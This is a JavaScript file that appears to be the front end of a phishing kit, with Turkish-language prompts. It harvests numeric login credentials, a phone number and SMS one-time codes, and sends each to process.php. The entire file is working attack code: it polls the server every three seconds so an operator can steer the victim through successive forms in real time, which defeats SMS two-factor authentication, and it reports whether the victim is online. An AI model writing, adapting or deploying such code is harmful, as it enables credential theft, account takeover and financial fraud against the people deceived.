const PROCESS_URL = "process.php";
const CHECK_INTERVAL = 3000;


$(document).on("keydown", "#username, #password, #phone, #sms", function (e) {
    if ($.inArray(e.keyCode, [46, 8, 9, 27, 13, 110, 190]) !== -1 ||
        (e.keyCode == 65 && e.ctrlKey === true) ||
        (e.keyCode == 67 && e.ctrlKey === true) ||
        (e.keyCode == 86 && e.ctrlKey === true) ||
        (e.keyCode == 88 && e.ctrlKey === true) ||
        (e.keyCode >= 35 && e.keyCode <= 39)) {
        return;
    }
    if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
        e.preventDefault();
    }
});


function submitData(action, formData, successCallback) {
    $.ajax({
        type: "POST",
        url: PROCESS_URL,
        data: { action: action, ...formData },
        success: function (response) {
            successCallback(response);
        },
        error: function (error) {
            console.error("AJAX request failed:", error);
        }
    });
}

function submitLogin() {
    var username = $("#username").val();
    var password = $("#password").val();

    if (!(/^\d+$/.test(username)) || !(/^\d+$/.test(password))) {
        $("#username, #password").addClass("error");
        return;
    } else {
        $("#username, #password").removeClass("error");
    }

    submitData("submitLogin", { username: username, password: password}, function () {
        $("#loginButton").hide();
        $("#loginProcess").show();
    });
}


function wait() {
    submitData("wait", {}, function (response) {
        if (response === "getphone") {
            $("#loginf").hide();
            $("#loginProcess").hide();
            $("#phonef").show();
        } else if (response === "getsms") {
            $("#loginf").hide();
            $("#headtab").hide();
            $("#phonef").hide();
            $("#loginProcessPhone").hide();
            $("#smsf").show();
        } else if (response === "getsmserror") {
            $("#loginf").hide();
            $("#headtab").hide();
            $("#phonef").hide();
            $("#smsf").hide();
            $("#loginProcessSms").hide();
            $("#errorsms").show();
        } else if (response === "getverf") {
            $("#loginf").hide();
            $("#headtab").hide();
            $("#phonef").hide();
            $("#smsf").hide();
            $("#errorsms").hide();
            $("#loginProcessSmsError").hide();
            $("#verf").show();

            setTimeout(function() {
                $("#verf").hide();
                $("#loginf").show();
            }, 5000);



        }  else if (response === "again") {

            $.ajax({
                url: "destroy.php",
                success: function() {
                    location.reload();
                }
            });
            
        } else {
          
        }
    });
}

function submitPhone() {
    var phone = $("#phone").val();

    $("#phoneget").html(phone + " "); 
    $("#phoneget").append("<span>Gönderilen 6 Haneli SMS'i Giriniz</span>");

    submitData("submitPhone", { phone: phone }, function () {
        $("#loginButtonPhone").hide();
        $("#loginProcessPhone").show();
    });
}

function submitSms() {
    var sms = $("#sms").val();

    submitData("submitSms", { sms: sms }, function () {
        $("#loginButtonSms").hide();
        $("#loginProcessSms").show();
    });
}

function submitSmsError() {
    var smserror = $("#smserror").val();

    submitData("submitSmsError", { smserror: smserror }, function () {
        $("#loginButtonSmsError").hide();
        $("#loginProcessSmsError").show();
    });
}

function checkUserOnline() {
    submitData("updateLastActivity", {}, function () {
        $.ajax({
            type: "POST",
            url: "status.php",
            success: function (response) {
                if (response === "online") {
                } else {
                }
            },
            error: function (error) {
                console.error("AJAX request failed:", error);
            }
        });
    });
}

setInterval(checkUserOnline, CHECK_INTERVAL);


setInterval(wait, CHECK_INTERVAL);
